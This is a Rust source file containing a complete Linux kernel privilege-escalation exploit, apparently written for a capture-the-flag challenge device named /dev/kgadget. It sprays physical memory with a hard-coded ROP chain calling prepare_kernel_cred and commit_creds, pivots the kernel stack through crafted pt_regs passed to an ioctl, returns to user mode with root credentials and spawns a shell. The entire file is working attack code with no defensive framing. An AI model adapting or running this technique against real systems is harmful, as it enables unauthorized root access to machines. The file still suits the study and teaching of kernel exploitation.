use std::os::fd::AsRawFd;

use kpwn::all::*;

#[repr(C)]
struct Payload {
    chain: [u64; 11],
    frame: TrapFrame64,
}

const CHAIN: [u64; 11] = [
    0xffffffff81aefae5, // new rbp
    // pop rdi
    0xffffffff81667f3d,
    0,
    // prepare_kernel_cred
    0xffffffff810c9540,
    // pop rbx
    0xffffffff814ec1db,
    // pop rdx ; pop rdi ; ret
    0xffffffff815d782b,
    // push rax ; call rbx
    0xffffffff818aba55,
    // commit_creds
    0xffffffff810c92e0,
    // swapgs_restore_regs_and_return_to_usermode + 0x1b
    0xffffffff81c00fcb,
    0xdeadbeef01,
    0xdeadbeef02,
];

extern "C" fn ret_from_kernel() -> ! {
    log::info!("Back from kernel space");
    whoami();
    execve_sh().unwrap();
    unreachable!();
}

fn main() {
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    whoami();

    log::info!("Performing physmap spray");
    let mut spray = MmapHandle::alloc_pages(32 * 1024).unwrap(); // 128 MiB
    let payload = Payload {
        chain: CHAIN,
        frame: TrapFrame64::new(ret_from_kernel),
    };
    spray.first_page().init_with_struct(&payload);
    spray.copy_first_page_to_others();
    log::info!("Spray done");
    // TODO: consider freeing physmap spray after successful exploit?

    let dev = open_dev("/dev/kgadget").unwrap();
    let mut regs = PtRegs::bogus();

    // ioctl args
    regs.rdi = dev.as_raw_fd() as u64;
    regs.rsi = 114514;

    // function pointer
    regs.rdx = 0xffff_8880_0600_0000; // physmap + 96 MiB
                                      // -> 0xffffffff81aefae5
                                      // 0xffffffff81aefae5 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

    // pt_regs
    regs.r9 = 0xffff_8880_0600_0000; // new rbp
    regs.r8 = 0xffffffff8161fd0d; // leave ; ret

    log::info!("Trigger!");
    unsafe {
        ioctl_with_regs(&regs);
    }

    log::error!("We failed :(");
    dev.close().unwrap();
}
